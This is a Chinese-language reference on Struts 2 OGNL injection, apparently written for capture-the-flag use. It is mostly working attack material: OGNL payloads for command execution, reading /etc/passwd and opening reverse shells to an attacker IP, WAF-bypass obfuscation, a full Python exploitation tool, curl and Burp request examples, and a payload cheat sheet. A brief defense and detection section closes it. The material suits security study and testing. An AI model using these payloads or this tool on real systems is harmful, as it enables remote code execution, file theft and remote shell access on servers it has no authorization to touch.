# OGNL注入 - Struts攻击库

## 概述

OGNL(Object-Graph Navigation Language)是Struts 2框架使用的表达式语言。OGNL注入漏洞允许攻击者通过构造特殊的OGNL表达式执行任意Java代码,最终导致远程命令执行(RCE)。这是Struts框架中最危险的漏洞类型之一。

**核心威胁**: 用户输入解析OGNL → 禁用安全限制 → ProcessBuilder执行命令 → RCE

## OGNL注入原理

### 危险的OGNL解析

```java
// 危险代码
public void setMessage(String message) {
    // 禁用方法执行限制
    ReflectionContextState.setDenyMethodExecution(
        ActionContext.getContext().getContextMap(), false
    );
    
    // 解析用户输入的OGNL表达式
    this.message = TextParseUtil.translateVariables(
        message, 
        ActionContext.getContext().getValueStack()
    );
}
```

**漏洞成因**:
1. `setDenyMethodExecution(false)` - 允许调用任意方法
2. `translateVariables()` - 解析OGNL表达式
3. 用户输入直接作为OGNL表达式解析

### OGNL表达式基础

```java
// 访问对象属性
%{user.name}

// 调用方法
%{user.getName()}

// 创建对象
%{new java.lang.String("test")}

// 执行命令
%{new java.lang.ProcessBuilder(new String[]{"cat","/etc/passwd"}).start()}
```

## 核心攻击技术

### 1. ProcessBuilder命令执行

**技术**: 使用ProcessBuilder执行系统命令

```ognl
%{
#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat","/tmp/flag"})).start(),
#b=#a.getInputStream(),
#c=new java.io.InputStreamReader(#b),
#d=new java.io.BufferedReader(#c),
#e=new char[50000],
#d.read(#e),
#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
#f.getWriter().println(new java.lang.String(#e)),
#f.getWriter().flush(),
#f.getWriter().close()
}
```

**流程分解**:
1. 创建ProcessBuilder并执行命令
2. 获取输入流读取输出
3. 通过HttpServletResponse返回结果

**应用场景**:
- 读取文件
- 执行系统命令
- 反弹Shell

### 2. Runtime.exec命令执行

**技术**: 使用Runtime.exec执行命令

```ognl
%{
#_memberAccess["allowStaticMethodAccess"]=true,
@java.lang.Runtime@getRuntime().exec("cat /tmp/flag")
}
```

**简化版**:
```ognl
%{
@java.lang.Runtime@getRuntime().exec("whoami")
}
```

### 3. 文件读取

**技术**: 读取服务器文件内容

```ognl
%{
#a=new java.io.FileInputStream("/etc/passwd"),
#b=new byte[1000],
#a.read(#b),
#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
#f.getWriter().println(new java.lang.String(#b)),
#f.getWriter().close()
}
```

### 4. 反弹Shell

**技术**: 建立反向Shell连接

```ognl
%{
#a=(new java.lang.ProcessBuilder(new java.lang.String[]{
  "bash","-c",
  "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
})).start()
}
```

### 5. 通过Response直接输出

**技术**: 直接写入HTTP响应

```ognl
%{
#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").
getWriter().println("RESULT"),
#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").
getWriter().close()
}
```

### 6. 绕过WAF技术

**技术**: 使用各种编码和混淆绕过WAF

```ognl
// 使用unicode
%{\u0023a=...}

// 分隔关键字
%{#a=(new java.lang.Process+"Builder"(...)).start()}

// 使用注释
%{#a=(new /*comment*/ java.lang.ProcessBuilder(...)).start()}
```

## 完整攻击工具

### OGNL注入自动化利用工具

```python
#!/usr/bin/env python3
"""
Struts OGNL注入自动化利用工具
支持命令执行、文件读取、反弹Shell
"""

import requests
import urllib.parse
import sys
import base64

class OGNLInjection:
    def __init__(self, target_url):
        self.target = target_url.rstrip('/')
        self.session = requests.Session()
        
    def generate_command_payload(self, command):
        """
        生成命令执行OGNL payload
        
        Args:
            command: 要执行的命令(字符串或列表)
        
        Returns:
            OGNL payload
        """
        if isinstance(command, str):
            cmd_parts = command.split()
        else:
            cmd_parts = command
        
        # 构造命令数组
        cmd_array = ','.join([f'"{part}"' for part in cmd_parts])
        
        # 完整OGNL payload
        payload = f'''%{{
#a=(new java.lang.ProcessBuilder(new java.lang.String[]{{{cmd_array}}})).start(),
#b=#a.getInputStream(),
#c=new java.io.InputStreamReader(#b),
#d=new java.io.BufferedReader(#c),
#e=new char[50000],
#d.read(#e),
#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
#f.getWriter().println(new java.lang.String(#e)),
#f.getWriter().flush(),
#f.getWriter().close()
}}'''
        
        return payload.strip()
    
    def generate_file_read_payload(self, file_path):
        """
        生成文件读取OGNL payload
        
        Args:
            file_path: 文件路径
        
        Returns:
            OGNL payload
        """
        payload = f'''%{{
#a=new java.io.FileInputStream("{file_path}"),
#b=new byte[10000],
#a.read(#b),
#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
#f.getWriter().println(new java.lang.String(#b)),
#f.getWriter().close()
}}'''
        
        return payload.strip()
    
    def generate_reverse_shell_payload(self, attacker_ip, port=4444):
        """
        生成反弹Shell OGNL payload
        
        Args:
            attacker_ip: 攻击者IP
            port: 监听端口
        
        Returns:
            OGNL payload
        """
        shell_cmd = f"bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1"
        
        payload = f'''%{{
#a=(new java.lang.ProcessBuilder(new java.lang.String[]{{
  "bash","-c","{shell_cmd}"
}})).start()
}}'''
        
        return payload.strip()
    
    def send_ognl_payload(self, payload, param='message'):
        """
        发送OGNL payload
        
        Args:
            payload: OGNL表达式
            param: 参数名
        
        Returns:
            响应对象
        """
        try:
            # URL编码
            encoded_payload = urllib.parse.quote(payload, safe='')
            
            # 构造请求
            data = {param: encoded_payload}
            
            print(f"[*] 发送OGNL payload...")
            print(f"[*] Payload长度: {len(payload)}")
            
            r = self.session.post(
                f"{self.target}/sendMessageAction",
                data=data,
                timeout=30
            )
            
            return r
            
        except Exception as e:
            print(f"[-] 请求失败: {e}")
            return None
    
    def exploit_command_execution(self, command):
        """
        利用OGNL执行命令
        
        Args:
            command: 要执行的命令
        
        Returns:
            命令输出
        """
        print(f"[*] 执行命令: {command}")
        
        payload = self.generate_command_payload(command)
        r = self.send_ognl_payload(payload)
        
        if r and r.status_code == 200:
            print(f"[+] 命令执行成功!")
            print(f"[+] 输出:\n{r.text[:500]}")
            return r.text
        else:
            print(f"[-] 命令执行失败")
            return None
    
    def exploit_file_read(self, file_path):
        """
        利用OGNL读取文件
        
        Args:
            file_path: 文件路径
        
        Returns:
            文件内容
        """
        print(f"[*] 读取文件: {file_path}")
        
        payload = self.generate_file_read_payload(file_path)
        r = self.send_ognl_payload(payload)
        
        if r and r.status_code == 200:
            print(f"[+] 文件读取成功!")
            print(f"[+] 内容:\n{r.text[:500]}")
            return r.text
        else:
            print(f"[-] 文件读取失败")
            return None
    
    def test_injection(self):
        """
        测试OGNL注入漏洞
        
        Returns:
            bool: 是否存在漏洞
        """
        print("[*] 测试OGNL注入...")
        
        # 简单测试payload
        test_payloads = [
            '%{1+1}',
            '%{2*2}',
            '%{@java.lang.System@getProperty("user.name")}',
        ]
        
        for payload in test_payloads:
            print(f"[*] 测试: {payload}")
            r = self.send_ognl_payload(payload)
            
            if r and r.status_code == 200:
                if '2' in r.text or '4' in r.text or 'root' in r.text.lower():
                    print(f"[+] OGNL注入确认!")
                    return True
        
        print("[-] 未检测到OGNL注入")
        return False
    
    def full_exploit(self, target_file="/tmp/flag"):
        """
        完整利用流程
        
        Args:
            target_file: 目标文件路径
        """
        print("=" * 60)
        print("[*] Struts OGNL注入完整利用")
        print("=" * 60)
        
        # 1. 测试注入
        if self.test_injection():
            print()
        
        # 2. 读取目标文件
        print(f"[*] 读取目标文件: {target_file}")
        result = self.exploit_file_read(target_file)
        
        if result and 'flag' in result.lower():
            print(f"\n[+] 发现FLAG!")
            import re
            flag = re.search(r'flag\{[^}]+\}', result, re.I)
            if flag:
                print(f"[+] FLAG: {flag.group()}")
                return True
        
        # 3. 尝试执行命令
        print("\n[*] 尝试命令执行...")
        
        commands = [
            f"cat {target_file}",
            "cat /flag",
            "cat /tmp/flag*",
            "find / -name '*flag*' 2>/dev/null",
        ]
        
        for cmd in commands:
            result = self.exploit_command_execution(cmd)
            if result and 'flag' in result.lower():
                print(f"\n[+] 发现FLAG!")
                import re
                flag = re.search(r'flag\{[^}]+\}', result, re.I)
                if flag:
                    print(f"[+] FLAG: {flag.group()}")
                    return True
        
        return False

def exploit_ognl_injection(target_url, command=None, file_path=None):
    """
    OGNL注入利用入口
    
    Args:
        target_url: 目标URL
        command: 要执行的命令(可选)
        file_path: 要读取的文件(可选)
    """
    print(f"[*] 目标: {target_url}")
    print()
    
    exploiter = OGNLInjection(target_url)
    
    if command:
        exploiter.exploit_command_execution(command)
    elif file_path:
        exploiter.exploit_file_read(file_path)
    else:
        exploiter.full_exploit()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("用法:")
        print(f"  {sys.argv[0]} <target_url>")
        print(f"  {sys.argv[0]} <target_url> --cmd <command>")
        print(f"  {sys.argv[0]} <target_url> --file <file_path>")
        print()
        print("示例:")
        print(f"  {sys.argv[0]} http://target:8080")
        print(f"  {sys.argv[0]} http://target:8080 --cmd 'whoami'")
        print(f"  {sys.argv[0]} http://target:8080 --file /etc/passwd")
        sys.exit(1)
    
    target = sys.argv[1]
    
    if len(sys.argv) > 2:
        if sys.argv[2] == '--cmd' and len(sys.argv) > 3:
            exploit_ognl_injection(target, command=sys.argv[3])
        elif sys.argv[2] == '--file' and len(sys.argv) > 3:
            exploit_ognl_injection(target, file_path=sys.argv[3])
        else:
            exploit_ognl_injection(target)
    else:
        exploit_ognl_injection(target)
```

## 实战场景

### 场景1: 读取FLAG文件

**目标**: 读取`/tmp/flag`

```python
payload = '''%{
#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat","/tmp/flag"})).start(),
#b=#a.getInputStream(),
#c=new java.io.InputStreamReader(#b),
#d=new java.io.BufferedReader(#c),
#e=new char[50000],
#d.read(#e),
#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
#f.getWriter().println(new java.lang.String(#e)),
#f.getWriter().close()
}'''

requests.post('http://target/sendMessageAction', 
              data={'message': payload})
```

### 场景2: 执行whoami

```ognl
%{
@java.lang.Runtime@getRuntime().exec("whoami")
}
```

### 场景3: 反弹Shell

```bash
# 攻击者机器监听
nc -lvnp 4444

# OGNL payload
%{
#a=(new java.lang.ProcessBuilder(new java.lang.String[]{
  "bash","-c",
  "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"
})).start()
}
```

## 手动测试命令

### 基本测试

```bash
# 1. 测试表达式解析
curl -X POST http://target/sendMessageAction \
  -d "message=%25%7B1%2B1%7D"
# 应返回2

# 2. 测试命令执行
curl -X POST http://target/sendMessageAction \
  -d "message=<URL编码的OGNL>"
```

### 使用burp Suite

```http
POST /sendMessageAction HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

message=%{(new java.lang.ProcessBuilder(new java.lang.String[]{"cat","/tmp/flag"})).start()}
```

## Payload速查表

### 命令执行
```ognl
// ProcessBuilder (推荐)
%{
#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cmd","arg"})).start(),
#b=#a.getInputStream(),
#c=new java.io.InputStreamReader(#b),
#d=new java.io.BufferedReader(#c),
#e=new char[50000],
#d.read(#e),
#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
#f.getWriter().println(new java.lang.String(#e)),
#f.getWriter().close()
}

// Runtime.exec
%{@java.lang.Runtime@getRuntime().exec("whoami")}
```

### 文件读取
```ognl
%{
#a=new java.io.FileInputStream("/etc/passwd"),
#b=new byte[10000],
#a.read(#b),
#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
#f.getWriter().println(new java.lang.String(#b)),
#f.getWriter().close()
}
```

### 反弹Shell
```ognl
%{
#a=(new java.lang.ProcessBuilder(new java.lang.String[]{
  "bash","-c","bash -i >& /dev/tcp/IP/PORT 0>&1"
})).start()
}
```

## 防御措施

### 1. 禁用OGNL解析

```java
// 不要这样做
TextParseUtil.translateVariables(userInput, valueStack);

// 安全做法: 直接赋值
this.message = userInput;
```

### 2. 保持安全限制

```java
// 不要禁用方法执行限制
ReflectionContextState.setDenyMethodExecution(context, false); // 危险!

// 保持默认安全设置
ReflectionContextState.setDenyMethodExecution(context, true);  // 安全
```

### 3. 升级Struts版本

```
使用最新的Struts 2版本
配置安全限制
禁用不必要的功能
```

### 4. 输入验证

```java
// 检测OGNL特征
if (input.contains("%{") || input.contains("@")) {
    throw new SecurityException("Invalid input");
}
```

## 检测特征

1. **OGNL语法**: `%{...}`, `#`, `@`
2. **Java类名**: `java.lang.ProcessBuilder`, `java.lang.Runtime`
3. **上下文访问**: `#context`, `#application`
4. **HTTP响应操作**: `HttpServletResponse`

## 相关CVE

- CVE-2017-5638: Struts2远程代码执行
- CVE-2018-11776: Struts2远程代码执行
- CVE-2019-0230: Struts2远程代码执行

## 总结

OGNL注入是Struts框架中的严重漏洞,主要利用点:
- 用户输入被解析为OGNL表达式
- 禁用了方法执行限制
- 可以创建Java对象并执行方法
- 通过ProcessBuilder执行系统命令

**关键攻击路径**: 识别OGNL解析点 → 构造ProcessBuilder payload → 执行命令 → 读取FLAG/反弹Shell

**防御重点**: 永远不要解析用户输入为OGNL表达式,保持安全限制,及时升级Struts版本。
